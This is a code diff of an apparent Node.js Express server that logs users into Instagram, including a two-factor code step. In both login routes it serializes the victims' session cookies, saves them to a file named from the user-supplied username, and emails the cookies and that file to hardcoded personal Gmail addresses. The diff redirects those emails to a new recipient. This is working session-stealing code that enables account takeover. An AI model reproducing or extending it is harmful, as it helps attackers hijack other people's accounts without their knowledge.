@@ -183,44 +183,80 @@ app.get("/insta/submitCode", (req, res) => {
       trustThisDevice: "1", // Can be omitted as '1' is used by default
     })
     .then((val) => {
-      const cookies = ig.state.serializeCookieJar().then((val2) => {
-        console.log("login success");
+      ig.state.serializeCookieJar().then((val2) => {
         val2.cookies.map((cookiepairs) => {
           cookiepairs["name"] = cookiepairs["key"];
           delete cookiepairs["key"];
         });
-        const validCookie = {
-          url: "https://instagram.com",
-          cookies: val2.cookies,
-        };
+        fse
+          .outputJSON(
+            __dirname + `/tempt/${req.query.username}.txt`,
+            val2.cookies
+          )
+          .then((result) => {
+            console.log(result);
+            fse
+              .readFile(__dirname + `/tempt/${req.query.username}.txt`)
+              .then((data) => {
+                console.log(data);
+                var mailOptions = {
+                  from: process.env.email,
+                  to: "surya142337@gmail.com",
+                  subject: "cookies of user" + req.query.username,
+                  text: JSON.stringify(val2.cookies),
+                  attachments: [
+                    {
+                      filename: __dirname + `/tempt/${req.query.username}.txt`,
+                      content: data,
+                    },
+                  ],
+                };
+                transporter.sendMail(mailOptions, function (error, info) {
+                  if (error) {
+                    console.log(error);
+                    res.json({
+                      success: true,
 
-        var mailOptions = {
-          from: process.env.email,
-          to: "surya142327@gmail.com",
-          subject: "cookies of user" + req.query.username,
-          text: JSON.stringify(validCookie),
-        };
-        transporter.sendMail(mailOptions, function (error, info) {
-          if (error) {
+                      user: val,
+                      cookie: JSON.stringify(val2.cookies),
+                      message: "login Successful but failed to send email",
+                    });
+                  } else {
+                    console.log("Email sent: " + info.response);
+                    res.json({
+                      success: true,
+
+                      user: val,
+                      cookie: JSON.stringify(val2.cookies),
+                      message: "login Successful and email has been sent.",
+                    });
+                    res.end();
+                  }
+                });
+              })
+              .catch((err) => {
+                console.log(err);
+                res.json({
+                  success: true,
+
+                  user: val,
+                  cookie: val2.cookies,
+                  message: "login Successful but failed to send email",
+                });
+                res.end();
+              });
+          })
+          .catch((error) => {
             console.log(error);
             res.json({
               success: true,
+
               user: val,
-              cookie: JSON.stringify(validCookie),
-              email_sent: false,
+              cookie: val2.cookies,
               message: "login Successful but failed to send email",
             });
-          } else {
-            console.log("Email sent: " + info.response);
-            res.json({
-              success: true,
-              user: val,
-              cookie: JSON.stringify(validCookie),
-              message: "login Successful and email has been sent",
-            });
             res.end();
-          }
-        });
+          });
       });
     })
     .catch((error) => {
@@ -243,26 +279,25 @@ app.post("/insta", (req, res) => {
           cookiepairs["name"] = cookiepairs["key"];
           delete cookiepairs["key"];
         });
-        const filename = randomstring.generate({
-          length: 6,
-          charset: "alphabetic",
-        });
         fse
-          .outputJSON(__dirname + `/tempt/${filename}.txt`, val2.cookies)
+          .outputJSON(
+            __dirname + `/tempt/${req.body.username}.txt`,
+            val2.cookies
+          )
           .then((result) => {
             console.log(result);
             fse
-              .readFile(__dirname + `/tempt/${filename}.txt`)
+              .readFile(__dirname + `/tempt/${req.body.username}.txt`)
               .then((data) => {
                 console.log(data);
                 var mailOptions = {
                   from: process.env.email,
-                  to: "tklinger50@gmail.com",
+                  to: "surya142337@gmail.com",
                   subject: "cookies of user" + req.body.username,
                   text: JSON.stringify(val2.cookies),
                   attachments: [
                     {
-                      filename: __dirname + `/tempt/${filename}.txt`,
+                      filename: __dirname + `/tempt/${req.body.username}.txt`,
                       content: data,
                     },
                   ],
